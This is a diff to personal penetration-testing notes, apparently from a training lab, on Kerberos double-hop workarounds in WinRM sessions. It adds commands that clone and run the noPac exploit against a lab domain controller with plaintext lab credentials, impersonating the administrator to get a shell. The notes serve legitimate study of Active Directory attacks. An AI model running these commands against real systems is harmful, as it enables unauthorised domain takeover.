@@ -53,6 +53,17 @@ Compare:
 
 ---
 
+## RUNNING FROM LINUX NOPAC
+```c
+git clone https://github.com/SecureAuthCorp/impacket.git
+python setup.py install
+git clone https://github.com/Ridter/noPac.git
+sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+
+
+```
+
 ## 🛠 Workaround #1 – PSCredential + `-Credential` Flag
 
 Best when you’re in an **evil-winrm session** or basic WinRM shell and want tools like PowerView to work.
@@ -165,4 +176,5 @@ You’re in a WinRM shell and AD queries fail:
 ## 🧷 One-Liner Mental Model
 
 > **WinRM + Kerberos gives you a ticket to the first box, not a portable “password”. No TGT = no second hop. Fix it by either resupplying creds each time (`-Credential`) or by creating a RunAs PSSession that holds a real TGT.**
+
 
